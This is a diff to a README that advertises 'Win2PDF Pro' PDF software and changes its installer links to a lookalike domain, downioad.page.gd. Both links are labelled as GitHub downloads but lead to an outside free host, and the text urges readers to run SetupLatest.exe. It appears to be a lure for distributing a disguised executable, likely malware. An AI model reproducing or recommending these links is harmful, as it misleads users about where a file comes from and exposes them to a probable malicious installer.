@@ -2,7 +2,7 @@
 
 Win2PDF Pro is a robust PDF conversion software tailored for Windows users, offering seamless document management and advanced features. This enhanced suite version for 2026 provides reliable performance, making it ideal for both personal and professional environments. With a focus on efficiency and user-friendliness, Win2PDF Pro streamlines your workflow for all PDF-related tasks.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -52,6 +52,6 @@ Here are answers to some common queries about Win2PDF Pro:
 
 To get started with Win2PDF Pro, download the latest version using the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link provides direct access to the installer file. Remember to use SetupLatest.exe for installation. For any further assistance, refer to the documentation or reach out to the support team. Last Updated: 2026.
